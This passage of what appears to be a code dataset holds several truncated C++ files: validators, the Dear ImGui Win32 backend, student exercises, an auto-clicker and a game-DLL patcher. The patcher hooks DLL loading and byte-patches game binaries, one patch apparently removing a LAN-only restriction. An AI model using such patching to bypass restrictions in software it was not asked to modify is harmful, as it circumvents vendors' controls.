atingidos.\");\n\n    if((sequenciaCrescente(senha) || sequenciaDecrescente(senha)))\n        throw invalid_argument(\"Senha: Senha em ordem crescente ou decrescente.\");\n    \n    if(senha[0] == '0')\n        throw invalid_argument(\"Senha: O primeiro digito deve ser diferente de Zero\");\n\n    // Verifica se o caractere digitado na senha \u00e9 um n\u00famero atrav\u00e9s do seu valor na tabela ascii\n    for(char numero : senha) {\n        int ascii = numero;\n\n        if(!(numero >= 48 && numero <= 57))\n            throw invalid_argument(\"Senha: Senha com caracteres invalidos\");\n    }\n\n    // Verifica se o n\u00famero \u00e9 repetido.\n    vector<int> numeroRepetido(10,false); // Vetor de booleanos para verifica\u00e7\u00e3o se algum n\u00famero \u00e9 repetido.\n    for(char ascii : senha) {\n        int numero = (ascii - '0');\n\n        if(numeroRepetido[numero] == true)\n            throw invalid_argument(\"Numero: Senha com n\u00fameros repetidos\");\n        \n        numeroRepetido[numero] = true;\n    }\n}\n\nvoid Senha::setSenha(string senha) {\n    validar(senha);\n    this->senha = senha;\n}\n\n//-------------------(Classe-Estado)---------------------------------//\nconst vector<string> Estado::ESTADOS_VALIDOS = {\"Previsto\", \"Liquidado\", \"Inadimplente\"};\n\nvoid Estado::validar(string estado) {\n    if(!(estado == ESTADOS_VALIDOS[0] || estado == ESTADOS_VALIDOS[1] ||estado == ESTADOS_VALIDOS[2]))\n        throw invalid_argument(\"Estado: Estado invalido\");\n}\n\nvoid Estado::setEstado(string estado) {\n    validar(estado);\n    this->estado = estado;\n}\n\n//-------------------(Classe-Percentual)---------------------------------//\n\nvoid Percentual::validar(float percentual) {\n    if(!(percentual >= 0 && percentual <= MAXIMO))\n        throw invalid_argument(\"Percentual: Percentual inv\u00e1lido!\");\n}\n\nvoid Percentual::setPercentual(float percentual) {\n    validar(percentual);\n    this->percentual = percentual;\n}\n\nvoid Percentual::setPercentual(string percentual) {\n    throw invalid_argument(\"Percentual: Apenas n\u00famero s\u00e3o aceitos.\");\n}\n\n//-------------------(Classe-CodigoDePagamento)---------------------------------//\n\nvoid CodigoDePagamento::validar(string codigoPagamento) {\n    for(char numero : codigoPagamento) {\n        int ascii = numero;\n\n        if(!(numero >= 48 && numero <= 57))\n            throw invalid_argument(\"CodigoDePagamento: c\u00f3digo com caracteres invalidos\");\n    }\n    \n    if(codigoPagamento[0] == '0')\n        throw invalid_argument(\"C\u00f3digoDePagamento: O primeiro digito do c\u00f3digo tem que ser diferente de zero\");\n}\n\nvoid CodigoDePagamento::setCodigoPagamento(string codigoPagamento) {\n    validar(codigoPagamento);\n    this->codigoPagamento = codigoPagamento;\n}\n\n//-------------------(Classe-Dinheiro)---------------------------------//\nbool Dinheiro::verificarNumero(string dinheiro) {\n    for(char numero : dinheiro) {\n        if(!isdigit(numero))\n            return false;\n    }\n    return true;\n}\n\nvoid Dinheiro::validar(string dinheiro) {\n    if(!verificarNumero(dinheiro))\n        throw invalid_a",
    "// dear imgui: Platform Backend for Windows (standard windows API for 32-bits AND 64-bits applications)\n// This needs to be used along with a Renderer (e.g. DirectX11, OpenGL3, Vulkan..)\n\n// Implemented features:\n//  [X] Platform: Clipboard support (for Win32 this is actually part of core dear imgui)\n//  [X] Platform: Mouse support. Can discriminate Mouse/TouchScreen/Pen.\n//  [X] Platform: Keyboard support. Since 1.87 we are using the io.AddKeyEvent() function. Pass ImGuiKey values to all key functions e.g. ImGui::IsKeyPressed(ImGuiKey_Space). [Legacy VK_* values will also be supported unless IMGUI_DISABLE_OBSOLETE_KEYIO is set]\n//  [X] Platform: Gamepad support. Enabled with 'io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad'.\n//  [X] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange'.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_impl_win32.h\"\n#ifndef WIN32_LEAN_AND_MEAN\n#define WIN32_LEAN_AND_MEAN\n#endif\n#include <windows.h>\n#include <windowsx.h> // GET_X_LPARAM(), GET_Y_LPARAM()\n#include <tchar.h>\n#include <dwmapi.h>\n\n// Configuration flags to add in your imconfig.h file:\n//#define IMGUI_IMPL_WIN32_DISABLE_GAMEPAD              // Disable gamepad support. This was meaningful before <1.81 but we now load XInput dynamically so the option is now less relevant.\n\n// Using XInput for gamepad (will load DLL dynamically)\n#ifndef IMGUI_IMPL_WIN32_DISABLE_GAMEPAD\n#include <xinput.h>\ntypedef DWORD (WINAPI *PFN_XInputGetCapabilities)(DWORD, DWORD, XINPUT_CAPABILITIES*);\ntypedef DWORD (WINAPI *PFN_XInputGetState)(DWORD, XINPUT_STATE*);\n#endif\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2023-10-05: Inputs: Added support for extra ImGuiKey values: F13 to F24 function keys, app back/forward keys.\n//  2023-09-25: Inputs: Synthesize key-down event on key-up for VK_SNAPSHOT / ImGuiKey_PrintScreen as Windows doesn't emit it (same behavior as GLFW/SDL).\n//  2023-09-07: Inputs: Added support for keyboard codepage conversion for when application is compiled in MBCS mode and using a non-Unicode window.\n//  2023-04-19: Added ImGui_ImplWin32_InitForOpenGL() to facilitate combining raw Win32/Winapi with OpenGL. (#3218)\n//  2023-04-04: Inputs: Added support for io.AddMouseSourceEvent() to discriminate ImGuiMouseSource_Mouse/ImGuiMouseSource_TouchScreen/ImGuiMouseSource_Pen. (#2702)\n//  2023-02-15: Inputs: Use WM_NCMOUSEMOVE / WM_NCMOUSELEAVE to track mouse position over non-client area (e.g. OS decorations) when app is not focused. (#6045, #6162)\n//  2023-02-02: Inputs: Flipping WM_MOUSEHWHEEL (horizontal mouse-wheel) value to match other backends and offer consistent horizontal scrolling direction. (#4019, #6096, #1463)\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2022-09-28: Inputs: Convert WM_CHAR values with MultiByteToWideChar() when window class was registered as MBCS (not Unicode).\n//  2022-09-26: Inputs: Renamed ImGuiKey_ModXXX introduced in 1.87 to ImGuiMod_XXX (old names still supported).\n//  2022-01-26: Inputs: replaced short-lived io.AddKeyModsEvent() (added two weeks ago) with io.AddKeyEvent() using ImGuiKey_ModXXX flags. Sorry for the confusion.\n//  2021-01-20: Inputs: calling new io.AddKeyAnalogEvent() for gamepad support, instead of writing directly to io.NavInputs[].\n//  2022-01-17: Inputs: calling new io.AddMousePosEvent(), io.AddMouseButtonEvent(), io.AddMouseWheelEvent() API (1.87+).\n//  2022-01-17: Inputs: always update key mods next and before a key event (not in NewFrame) to fix input queue with very low framerates.\n//  2022-01-12: Inputs: Update mouse inputs using WM_MOUSEMOVE/WM_MOUSELEAVE + fallback to provide it when focused but not hovered/captured. More standard and will allow us to pass it to future input queue API.\n//  2022-01-12: Inputs: Maintain our own copy of MouseButtonsDown mask instead of using ImGui::IsAnyMouseDown() which will be obsoleted.\n//  2022-01-10: Inputs: calling new io.AddKeyEvent(), io.AddKeyModsEvent() + io.SetKeyEventNativeData() API (1.87+). Support for full ImGuiKey range.\n//  2021-12-16: Inputs: Fill VK_LCONTROL/VK_RCONTROL/VK_LSHIFT/VK_RSHIFT/VK_LMENU/VK_RMENU for completeness.\n//  2021-08-17: Calling io.AddFocusEvent() on WM_SETFOCUS/WM_KILLFOCUS messages.\n//  2021-08-02: Inputs: Fixed keyboard modifiers being reported when host window doesn't have focus.\n//  2021-07-29: Input",
    "#include \"silver-bun.h\"\n#include \"ntldr.h\"\n#include \"MinHook.h\"\n#include \"cstdio\"\n#include \"patches.h\"\n#include \"ntstatus.h\"\n\nvoid(__thiscall* oUpdateAreaBits)(void* this_, void* pl, void* a);\n\nvoid __fastcall UpdateAreaBits_not_reckless(void* this_, void* edx, void* player, void* areabits) {\n\tif (!player) {\n\t\tprintf(\"null player in UpdateAreaBits\\n\");\n\t\treturn;\n\t}\n\treturn oUpdateAreaBits(this_, player, areabits);\n}\n\nstd::map<std::string, std::set<uintptr_t>> hooked_functions;\n\nmempatch_table_t patches = {\n\t{\n\t\t\"engine.dll\",\n\t\t\t{\n\t\t\t\t{ \"51 8B 44 24 ? 8B 4C 24 ? 50\", {0x31,0xC0,0xC3} }, // xor eax, eax ret\n\t\t\t\t{ \"E8 ? ? ? ? 8B 4C 24 ? 51 57 8B CE E8 ? ? ? ? 5F 5E C2 ? ? CC\", {0x90,0x90,0x90,0x90,0x90} }, // nop call\n\t\t\t\t{ \"81 EC ? ? ? ? 89 4C 24 ? 8B 0D\", {0xC2,0x04,0x00} }, // ret 4\n\t\t\t\t{ \"8B 06 68 ? ? ? ? EB\", {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90}}, // lan only mode my ass\n\t\t\t\t{ \"81 EC ? ? ? ? 53 55 8B D9 8B 03\", {0xC2, 0x08, 0x00} }, // save restore? short answer\n\t\t\t\t{ \"56 8B F1 8B 0D ? ? ? ? 8B 01 8B 90 ? ? ? ? FF D2 8D 4E\", {0xC3} }, // save restore? long answer\n\t\t\t},\n\t},\n\t{\n\t\t\"materialsystem.dll\",\n\t\t\t{\n\t\t\t\t{ \"81 EC ? ? ? ? 53 8B 9C 24 ? ? ? ? 56 57 BF\", {0xC2,0x04,0x00} }, // ret 4\n\t\t\t\t{ \"83 EC ? 53 55 56 57 8B F9\", {0xC3} } // ret\n\t\t\t}\n\t},\n\t{\n\t\t\"server.dll\",\n\t\t\t{\n\t\t\t\t{\"80 78 ? ? 75 ? 68 ? ? ? ? E8\", {0x90,0x90,0x90,0x90,0x90,0x90} }, // gamerules\n\t\t\t}\n\t}\n};\n\ndetour_table_t detours = {\n\t{\n\t\t\"server.dll\",\n\t\t{\n\t\t\t{0x1D9DB0 , &UpdateAreaBits_not_reckless, (void**)&oUpdateAreaBits}\n\t\t}\n\t}\n};\n\nvoid LoadCallback(const char* str, void* module_base) {\n\n\tfor (auto& kv_pair : patches) {\n\t\tif (kv_pair.first == str) {\n\t\t\tprintf(\"patching %s\\n\", str);\n\t\t\t// patch module\n\t\t\tCModule mod((uintptr_t)module_base);\n\t\t\tfor (auto& patch_pair : kv_pair.second) {\n\t\t\t\tCMemory mem = mod.FindPatternSIMD(patch_pair.first.c_str());\n\t\t\t\tif (!mem) {\n\t\t\t\t\tprintf(\"Failed mempatching %s! Patched already?\\n\", kv_pair.first.c_str());\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\tmem.Patch(patch_pair.second);\n\t\t\t}\n\t\t}\n\t}\n\n\tfor (auto& kv_pair : detours) {\n\t\tif (kv_pair.first == str) {\n\t\t\tfor (auto& detour : kv_pair.second) {\n\n\t\t\t\tif (hooked_functions.contains(kv_pair.first) && hooked_functions[kv_pair.first].contains(detour.fn)) {\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\n\t\t\t\tchar* mbase = (char*)module_base;\n\t\t\t\tif (MH_CreateHook(mbase + detour.fn, detour.detour, detour.trampoline) == MH_OK && MH_EnableHook(mbase + detour.fn) == MH_OK) {\n\t\t\t\t\tprintf(\"detoured %p successfully!\\n\", mbase + detour.fn);\n\t\t\t\t\tif (!hooked_functions.contains(kv_pair.first)) {\n\t\t\t\t\t\thooked_functions[kv_pair.first] = {};\n\t\t\t\t\t}\n\t\t\t\t\thooked_functions[kv_pair.first].insert(detour.fn);\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tprintf(\"couldn't detour %p!\\n\", mbase + detour.fn);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n}\n\nvoid UnloadCallback(const char* str, void* module_base) {\n\tif (hooked_functions.contains(str)) {\n\t\tfor (auto& fn : hooked_functions[str]) {\n\t\t\tchar* base = (char*)module_base;\n\t\t\tMH_RemoveHook(base + fn);\n\t\t}\n\t}\n}\n\nvoid __stdcall MyLdrDllNotification( ULONG NotificationReason, PLDR_DLL_NOTIFICATION_DATA NotificationData, PVOID Context) {\n\tchar dllname[MAX_PATH];\n\tsize_t ms_forced_me_to_create_this_variable;\n\n\tif (NotificationReason == LDR_DLL_NOTIFICATION_REASON_LOADED) {\n\t\twcstombs_s(&ms_forced_me_to_create_this_variable, dllname, NotificationData->Loaded.BaseDllName->Buffer, MAX_PATH);\n\t\tLoadCallback(dllname, NotificationData->Loaded.DllBase);\n\t}\n\n\tif (NotificationReason == LDR_DLL_NOTIFICATION_REASON_UNLOADED) {\n\t\twcstombs_s(&ms_forced_me_to_create_this_variable, dllname, NotificationData->Unloaded.BaseDllName->Buffer, MAX_PATH);\n\t\tUnloadCallback(dllname, NotificationData->Unloaded.DllBase);\n\t}\n}\n\nPVOID cookie;\n\nvoid PatchesInit() {\n\tMH_Initialize();\n\n\t_LdrRegisterDllNotification LdrRegisterDllNotification = (_LdrRegisterDllNotification)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"LdrRegisterDllNotification\");\n\n\tif (LdrRegisterDllNotification(0, MyLdrDllNotification, NULL, &cookie) != STATUS_SUCCESS) {\n\t\tprintf(\"NTSTATUS != STATUS_SUCCESS!\\n\");\n\t}\n}",
    "#include<iostream>\nusing namespace std;\n\nint main()\n{   float height, weight;\nstring bmi1;\n    cout<<endl<<\"                           WELCOME | BMI CALCULATOR                           \"<<endl;\n    cout<<\"-------------------------------------------------------------------------------\"<<endl;\n    sub:\n    cout<<\"   MENU:\"<<endl;\n    cout<<\"Enter your height in cm:\";\n    cin>>height;\n    cout<<\"-------------------------\"<<endl;\n    cout<<\"Enter your weight in kg:\";\n    cin>>weight;\n    cout<<endl<<endl;\n    float height1=height/100;\n    float height2=height1*height1;\n    float bmi=weight/height2;\n    if(bmi<=18){\n        bmi1=\"UNDERWEIGHT\";\n    }\n    else if(bmi>=18 && bmi<=25){\n        bmi1=\"NORMAL\";\n    }\n    else{\n        bmi1=\"OVERWEIGHT\";\n    }\n    cout<<\"       YOUR BMI: \"<<bmi<<\" || STATUS: \"<<bmi1<<endl;\n    cout<<\"Press 1 for Again Calculation\"<<endl;\n    cout<<\"Press 2 for exit Application\"<<endl;\n    int option;\n    cin>>option;\n    switch (option)\n    {\n    case 1:\n        goto sub;\n        break;\n        case 2:\n       exit(EXIT_SUCCESS);\n    \n    default:\n    cout<<endl<<\"You have choose a wrong option!\"<<endl;\n        break;\n    }\n    return 0;\n}\n",
    "#include \"banking_system.h\"\r\n\r\nusing namespace std;\r\n\r\nBankingSystem::BankingSystem() : num_accounts(0) {}\r\n\r\nAccount *BankingSystem::findAccount(int account_number)\r\n{\r\n    for (int i = 0; i < num_accounts; ++i)\r\n    {\r\n        if (accounts[i].account_number == account_number)\r\n        {\r\n            return &accounts[i];\r\n        }\r\n    }\r\n    return nullptr;\r\n}\r\n\r\nvoid BankingSystem::createAccount(int account_number, const string &owner, double initial_balance)\r\n{\r\n    if (num_accounts >= MAX_ACCOUNTS)\r\n    {\r\n        cout << \"Error: Maximum number of accounts reached.\" << endl;\r\n        return;\r\n    }\r\n\r\n    Account new_account;\r\n    new_account.account_number = account_number;\r\n    new_account.owner = owner;\r\n    new_account.balance = initial_balance;\r\n    new_account.num_transactions = 0;\r\n\r\n    accounts[num_accounts++] = new_account;\r\n    cout << \"Account created successfully.\" << endl;\r\n}\r\n\r\nvoid BankingSystem::deposit(int account_number, double amount)\r\n{\r\n    Account *account = findAccount(account_number);\r\n    if (account == nullptr)\r\n    {\r\n        cout << \"Error: Account not found.\" << endl;\r\n        return;\r\n    }\r\n    if (amount <= 0)\r\n    {\r\n        cout << \"Error: Invalid amount.\" << endl;\r\n        return;\r\n    }\r\n    account->balance += amount;\r\n\r\n    // Update transaction history\r\n    Transaction *transaction = &account->transactions[account->num_transactions++];\r\n    transaction->account_number = account_number;\r\n    transaction->type = \"Deposit\";\r\n    transaction->amount = amount;\r\n\r\n    cout << \"Deposit successful. New balance: \" << account->balance << endl;\r\n}\r\n\r\nvoid BankingSystem::withdraw(int account_number, double amount)\r\n{\r\n    Account *account = findAccount(account_number);\r\n    if (account == nullptr)\r\n    {\r\n        cout << \"Error: Account not found.\" << endl;\r\n        return;\r\n    }\r\n    if (amount <= 0 || amount > account->balance)\r\n    {\r\n        cout << \"Error: Insufficient funds or invalid amount.\" << endl;\r\n        return;\r\n    }\r\n    account->balance -= amount;\r\n\r\n    // Update transaction history\r\n    Transaction *transaction = &account->transactions[account->num_transactions++];\r\n    transaction->account_number = account_number;\r\n    transaction->type = \"Withdrawal\";\r\n    transaction->amount = amount;\r\n\r\n    cout << \"Withdrawal successful. New balance: \" << account->balance << endl;\r\n}\r\n\r\nvoid BankingSystem::transfer(int from_account_number, int to_account_number, double amount)\r\n{\r\n    Account *from_account = findAccount(from_account_number);\r\n    Account *to_account = findAccount(to_account_number);\r\n    if (from_account == nullptr || to_account == nullptr)\r\n    {\r\n        cout << \"Error: One or both accounts not found.\" << endl;\r\n        return;\r\n    }\r\n    if (amount <= 0 || amount > from_account->balance)\r\n    {\r\n        cout << \"Error: Insufficient funds or invalid amount.\" << endl;\r\n        return;\r\n    }\r\n    from_account->balance -= amount;\r\n    to_account->balance += amount;\r\n\r\n    // Update transaction history for both accounts\r\n    Transaction *transaction1 = &from_account->transactions[from_account->num_transactions++];\r\n    transaction1->account_number = from_account_number;\r\n    transaction1->type = \"Transfer (to)\";\r\n    transaction1->amount = amount;\r\n\r\n    Transaction *transaction2 = &to_account->transactions[to_account->num_transactions++];\r\n    transaction2->account_number = to_account_number;\r\n    transaction2->type = \"Transfer (from)\";\r\n    transaction2->amount = amount;\r\n\r\n    cout << \"Transfer successful. New balance for \" << from_account->owner << \": \" << from_account->balance << endl;\r\n    cout << \"New balance for \" << to_account->owner << \": \" << to_account->balance << endl;\r\n}\r\n\r\nvoid BankingSystem::calculateInterest(double rate)\r\n{\r\n    for (int i = 0; i < num_accounts; ++i)\r\n    {\r\n        accounts[i].balance *= (1 + rate);\r\n    }\r\n    cout << \"Interest calculated and applied to all accounts.\" << endl;\r\n}\r\n\r\nvoid BankingSystem::displayTransactions(int account_number)\r\n{\r\n    Account *account = findAccount(account_number);\r\n    if (account == nullptr)\r\n    {\r\n        cout << \"Error: Account not found.\" << endl;\r\n        return;\r\n    }\r\n    cout << \"Transaction history for account \" << account->account_number << \" (\" << account->owner << \"):\" << endl;\r\n    for (int i = 0; i < account->num_transactions; ++i)\r\n    {\r\n        Transaction *transaction = &account->transactions[i];\r\n        cout << \"Type: \" << transaction->type << \", Amount: \" << transaction->amount << endl;\r\n    }\r\n}\r\n\r\nvoid BankingSystem::deleteAccount(int account_number)\r\n{\r\n    for (int i = 0; i < num_accounts; ++i)\r\n    {\r\n        if (accounts[i].account_number == account_number)\r\n        {\r\n            // Shift remaining accounts to fill the gap\r\n            for (int j = i; j < num_accounts - 1; ++j)\r\n            {\r\n                accounts[j] = accounts[j + 1];\r\n            }\r\n            num_accounts--;\r\n            cout << \"Account \" << account_number << \" deleted success",
    "// https://dmoj.uclv.edu.cu/problem/envpaq\n\n#include<bits/stdc++.h>\nusing namespace std ;\n\n#define MAX 50001\n\nint dist[MAX];\nbool mark[MAX];\n\nvector<pair<int, int> > v[MAX];\n\nvoid distra(int node){\n    dist[node] = 0;\n    priority_queue<pair<int, int> > q;\n    q.push({0, node});\n    int ac;\n    while(!q.empty()){\n\n        ac = q.top().second;\n        q.pop();\n\n        if(!mark[ac]){\n\n            mark[ac] = 1;\n            for(auto u: v[ac]){\n                int b = u.first;\n                int w = u.second;\n                if(dist[b] > dist[ac]+w){\n                    dist[b] = dist[ac] + w;\n                    q.push({-dist[b], b});\n                }\n            }\n\n        }\n\n    }\n}\n\n\nint main(){\n\n    ios_base::sync_with_stdio(0);\n    cin.tie(0);\n\n\n    int n, m;\n    scanf(\"%d%d\", &n, &m);\n\n    for(int i=0;i<m;i++){\n        int a, b, c;\n        scanf(\"%d%d%d\", &a, &b, &c);\n        v[a].push_back(make_pair(b, c));\n        v[b].push_back(make_pair(a, c));\n    }\n\n\n    for(int i=1;i<=n;i++) dist[i] = 1e9;\n\n    distra(1);\n\n    cout<<dist[n];\n\n\n    return 0;\n}",
    "#include <iostream>\r\n#include <fstream>\r\n#include <vector>\r\n#include <iomanip> \r\nusing namespace std;\r\n\r\nclass Robot {\r\nprotected:\r\n    int batteryLife;\r\n    int* cleaningArea;\r\n    int* cleaningTime;\r\n    int hiz[2];\r\n\r\npublic:\r\n    virtual void move(int hedefX, int hedefY) = 0;\r\n    Robot() {\r\n        \r\n        hiz[0] = 0;\r\n        hiz[1] = 1;\r\n        cleaningArea = new int;\r\n\t\tbatteryLife = 100;\r\n        cleaningTime = new int;\r\n    }\r\n\r\n    virtual ~Robot() {\r\n        delete cleaningArea;\r\n        delete cleaningTime;\r\n    }\r\n};\r\n\r\nclass RobotSweeper : protected Robot {\r\nprivate:\r\n\t\tint *currentX;\r\n\t\tint *currentY;\r\n\t\tint *currentBatteryLife;\r\n\t\tint *x2;\r\n\t\tint *y2;\r\n\t\tint *paspas_suyu;\t\r\n\r\npublic:\r\n    RobotSweeper() : currentX(new int(0)), currentY(new int(0)), currentBatteryLife(new int(100)), paspas_suyu(new int(0)), x2(new int(0)), y2(new int(0)) { }\r\n    ~RobotSweeper() {\r\n        delete currentX;\r\n        delete currentY;\r\n        delete currentBatteryLife;\r\n        delete x2;\r\n        delete y2;\r\n        delete paspas_suyu;\r\n    }\r\n  \tint &cleaningtime_getir(){\r\n\t\treturn *cleaningTime;\r\n\t\t}\r\n\tint &batterylife_getir(){\r\n\t\treturn *currentBatteryLife;\r\n\t\t}\r\n\r\n\tvoid vacuum(){\r\n\t\t\tif (*currentBatteryLife <= 5) {\r\n              \trobotu_sarj_etme();}\r\n            else{\r\n\t\t\t}\r\n\t\t\t}\t\r\n\t\t\t\r\n\tvoid mop() {\r\n    \tif (*paspas_suyu > 0 && *currentBatteryLife > 5) {\r\n        \tif (hiz[0] == 1) {\r\n            \t*currentBatteryLife = (*currentBatteryLife) - (*currentBatteryLife * 0.02);\r\n\t\t\t\t*paspas_suyu -= 1;}\r\n\t\t\t\t\r\n            else {\r\n            \t*currentBatteryLife = (*currentBatteryLife )- (*currentBatteryLife * 0.03);\r\n\t\t\t\t*paspas_suyu -= 1;}\r\n        }\r\n        else{\r\n\t        robotu_sarj_etme();\r\n\t\t\t}\r\n    }\r\n\r\n\tvoid sarj_istasyonuna_gitme() {\r\n    \t*x2 = *currentX;\r\n    \t*y2 = *currentY;\r\n    \t*currentX = 0;\r\n    \t*currentY = 0;\r\n\t\t}\r\n\tvoid robotu_sarj_etme(){\r\n\t\tsarj_istasyonuna_gitme();\r\n\t\t*currentBatteryLife = 100;\r\n\t\t*cleaningTime +=10;\r\n\t\t(*currentX) = (*x2)  ; \r\n    \t(*currentY) =(*y2) ; \r\n\t}\r\n\r\n\t\r\n\tRobotSweeper& operator=(const RobotSweeper& n) {\r\n   \t\t\t*y2 = *n.y2;\r\n   \t\t\t*x2 = *n.x2;\r\n   \t\t\t*cleaningTime = *n.cleaningTime;\r\n   \t\t\t*paspas_suyu = *n.paspas_suyu;\r\n        \t*currentBatteryLife = *n.currentBatteryLife;\r\n        \t*currentX = *n.currentX;\r\n        \t*currentY = *n.currentY;\r\n     \t\treturn *this;\r\n   }\r\n    void move(int x,int y) override {\r\n\t\tif(*currentBatteryLife <= 5){\r\n\t\t\tcout << \"Hareket icin yeterli enerji yok\" << endl;\r\n\t\t\trobotu_sarj_etme();\r\n\t\t\t}\r\n\t\tint x_mesafe = x - (*currentX);\r\n\t\tint y_mesafe = y - (*currentY);\r\n\t\tif(x_mesafe>0 || y_mesafe > 0) {\r\n\t\t\t(*currentY) += 1;\r\n\t\t}\r\n\t\tif(x_mesafe<0 || currentY < 0) {\r\n\t\t\t(*currentY) += 1;\r\n\t\t}\r\n    \tif (x_mesafe < 0) {\r\n        \t(*currentX) -= 1;\r\n    \t}\r\n    \tif (x_mesafe > 0) {\r\n        (*currentX) += 1;\r\n    \t}\r\n    \tif (currentY < 0) {\r\n        \t(*currentY) -= 1;\r\n    \t}\r\n    \tif (currentY > 0) {\r\n        \t(*currentY) += 1;\r\n    \t}\r\n\r\n\t\tif (hiz[0] == 1) {\r\n        \t*currentBatteryLife = (*currentBatteryLife) - (*currentBatteryLife * 0.01);\r\n        \t*cleaningTime += 2;}\t\t\r\n    \telse {\r\n        \t*currentBatteryLife = (*currentBatteryLife) - (*currentBatteryLife * 0.02);\r\n\t\t\t*cleaningTime += 1;\r\n\t\t\t}\r\n\t\t\t}\r\n\r\n};\r\nclass House{\r\n\tpublic:\r\n\t\tint x;\r\n\t\tint y;\r\n\t\tHouse() : x(0), y(0) {}\r\n\t\t\r\n};\r\nclass Room:public House{\r\npublic:\r\n\tint x1;\r\n\tint y1;\r\n\tint obstacleX;\r\n\tint obstacleY;\r\n\tRoom() : x1(0), y1(0),obstacleX(0),obstacleY(0){}\r\n\tint getRoom() const {\r\n        cout << \"Oda Bilgisi:\" << endl;\r\n        cout << \"Kordinatlar: (\" << x1 << \", \" << y1 << \")\" << std::endl;\r\n        cout << \"Engel Kordinatlari: (\" << obstacleX << \", \" << obstacleY << \")\" << std::endl;\r\n        return x1 + y1 + obstacleX + obstacleY;\r\n    }\r\n};\r\nclass Area:public House{\r\npublic:\r\n\tint edgeX;\r\n\tint edgeY;\r\n\tArea() : edgeX(0), edgeY(0){}\r\n\tint getArea() const {\r\n        std::cout << \"Konum Bilgisi:\" << std::endl;\r\n        std::cout << \"Engel Kordinatlari: (\" << edgeX << \", \" << edgeY << \")\" << std::endl;\r\n        return edgeX * edgeY;\r\n    }\r\n};\r\nvoid harita_dosyasi_okuma(const std::string& dosyaadi, std::vector<Room>& odalar, std::vector<std::pair<int, int>>& engel) {\r\n    ifstream inputFile(dosyaadi);\r\n    string obje_turu;\r\n    if (!inputFile) {\r\n        cerr << \"Dosya acilamadi !!\" << endl;\r\n        exit(EXIT_FAILURE);\r\n    }\r\n\r\n    while (inputFile >> obje_turu) {\r\n        if (obje_turu == \"Room\") {\r\n            Room oda;\r\n            inputFile >> oda.x1 >> oda.y1 >> oda.obstacleX >> oda.obstacleY;\r\n            odalar.push_back(oda);\r\n        } else if (obje_turu == \"Obstacle\") {\r\n            int engel_x;\r\n\t\t\tint engel_y;\r\n            inputFile >> engel_x >> engel_y;\r\n            engel.emplace_back(engel_x, engel_y);\r\n        }\r\n    }\r\n\r\n    inputFile.close();\r\n}\r\n\r\n\r\nvoid cleanArea(RobotSweeper& robot, int ilk_x, int ilk_y, int son_x, int son_y, const vector<pair<int, int>>& engeller) {\r\n    int& cleaningTime = robot.cleaningtime_getir();\r\n    int& batt",
    "#include <iostream>\n\n#include \"string_processing.h\"\n#include \"clicker.h\"\n\nClicker::Clicker(HWND h_windows_handle) : h_windows_handle_(h_windows_handle) {}\n\nLeftMouseClicker::LeftMouseClicker(HWND h_windows_handle) : Clicker(h_windows_handle) {}\n\nRightMouseClicker::RightMouseClicker(HWND h_windows_handle) : Clicker(h_windows_handle) {}\n\nSpaceButtonClicker::SpaceButtonClicker(HWND h_windows_handle) : Clicker(h_windows_handle) {}\n\nHWND Clicker::GetWindowHandle() const{\n\treturn h_windows_handle_;\n}\n\nvoid Clicker::SetDelay(size_t delay){\n\tdelay_ = delay;\n}\n\nsize_t Clicker::GetDelay() const{\n\treturn delay_;\n}\n\nvoid RightMouseClicker::Click() const{\n\tINPUT input{};\n\tinput.type = INPUT_MOUSE;\n\tinput.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;\n\tSendInput(1, &input, sizeof(INPUT));\n\tinput.mi.dwFlags = MOUSEEVENTF_RIGHTUP;\n\tSendInput(1, &input, sizeof(input));\n}\n\nvoid LeftMouseClicker::Click() const{\n\tINPUT input{};\n\tinput.type = INPUT_MOUSE;\n\tinput.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;\n\tSendInput(1, &input, sizeof(INPUT));\n\tinput.mi.dwFlags = MOUSEEVENTF_LEFTUP;\n\tSendInput(1, &input, sizeof(input));\n}\n\nvoid SpaceButtonClicker::Click() const {\n\tINPUT input{};\n\tinput.type = INPUT_KEYBOARD;\n\tinput.ki.wVk = VK_SPACE; \n\tinput.ki.dwFlags = 0; \n\tSendInput(1, &input, sizeof(INPUT));\n\tinput.ki.dwFlags = KEYEVENTF_KEYUP;\n\tSendInput(1, &input, sizeof(INPUT));\n}\n\nvoid LeftMouseClicker::ClickInsideApplication() const{\n\tRECT rect;\n\tGetWindowRect(Clicker::GetWindowHandle(), &rect);\n\tint x = (rect.left + rect.right) / 2;\n\tint y = (rect.top + rect.bottom) / 2;\n\n\tPostMessage(Clicker::GetWindowHandle(), WM_LBUTTONDOWN, MK_LBUTTON, MAKELPARAM(x, y));\n\tPostMessage(Clicker::GetWindowHandle(), WM_LBUTTONUP, 0, MAKELPARAM(x, y));\n}\n\nvoid RightMouseClicker::ClickInsideApplication() const {\n\tRECT rect;\n\tGetWindowRect(Clicker::GetWindowHandle(), &rect);\n\tint x = (rect.left + rect.right) / 2;\n\tint y = (rect.top + rect.bottom) / 2;\n\n\tPostMessage(Clicker::GetWindowHandle(), WM_RBUTTONDOWN, MK_RBUTTON, MAKELPARAM(x, y));\n\tPostMessage(Clicker::GetWindowHandle(), WM_RBUTTONUP, 0, MAKELPARAM(x, y));\n}\n\nvoid SpaceButtonClicker::ClickInsideApplication() const {\n\tPostMessage(Clicker::GetWindowHandle(), 